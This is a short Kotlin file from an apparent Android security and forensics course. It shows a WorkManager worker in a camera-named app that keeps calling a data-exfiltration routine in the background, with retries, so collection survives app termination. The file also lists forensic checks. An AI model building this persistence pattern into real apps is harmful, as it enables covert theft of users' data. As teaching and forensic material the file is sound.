package com.example.fancycam

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters

/**
 * EDUCATIONAL DEMO - Android Security & Forensics Course
 *
 * Demonstrates how malware uses WorkManager for persistent background
 * data collection that survives app termination.
 *
 * FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.
 *
 * Forensic analysis points:
 *  - Check WorkManager database: /data/data/com.example.fancycam/androidx.work.workdb
 *  - Look for scheduled workers in the work specification table
 *  - Monitor logcat for DataCollectionWorker tags
 */
class DataCollectionWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        Log.d(TAG, "[EDUCATIONAL] Background data collection triggered")

        return try {
            DataExfilSender.collectAndExfiltrate(applicationContext)
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Background collection failed", e)
            Result.retry()
        }
    }

    companion object {
        private const val TAG = "DataCollectionWorker"
        const val WORK_NAME = "edu_data_collection"
    }
}
